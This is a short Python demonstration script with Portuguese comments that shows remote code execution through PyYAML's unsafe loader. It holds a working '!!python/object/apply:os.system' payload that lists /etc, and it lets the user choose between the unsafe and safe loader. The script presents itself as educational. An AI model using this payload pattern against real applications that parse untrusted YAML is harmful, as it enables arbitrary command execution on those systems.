import yaml
import sys
import os
import io

# Aviso: Este script é para fins educacionais e de teste em ambiente seguro.

# O payload malicioso
yaml_rce_payload = """
!!python/object/apply:os.system ['ls -l /etc/']
"""

def demonstrar_rce(payload):
    """
    Recebe um payload YAML malicioso e tenta carregá-lo usando PyYAML,
    demonstrando uma vulnerabilidade de execução remota de código (RCE).
    Args:
        payload (_type_): Payload YAML malicioso.
    Returns: None
    """
    loader_class = yaml.Loader

    try:
        choice = input("Usar Loader inseguro? (s/n): ").strip().lower()
        if choice == 's':
            dados = yaml.load(io.StringIO(payload), Loader=loader_class)
        else:
            dados = yaml.safe_load(io.StringIO(payload))
    except Exception as e:
        print(f"Erro ao carregar YAML: {e}")

if __name__ == "__main__":
    demonstrar_rce(yaml_rce_payload)